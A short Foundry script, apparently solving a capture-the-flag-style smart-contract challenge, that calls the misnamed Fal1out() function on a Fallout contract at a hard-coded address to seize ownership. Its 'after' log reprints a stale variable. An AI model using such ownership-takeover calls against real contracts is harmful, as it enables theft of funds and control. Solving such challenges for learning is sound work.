// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Fallout.sol";

contract FallbackScript is Script {
    Fallout target;
    address owner;

    function setUp() public {
        target = Fallout(payable(0x60048C73f39B7D2632D477D85B94f0565461E5e2));
        owner = target.owner();
    }

    function run() public {
        vm.startBroadcast();

        console.log("before owner: ", owner);
        // change owner
        target.Fal1out();
        console.log("after owner: ", owner);

        vm.stopBroadcast();
    }
}
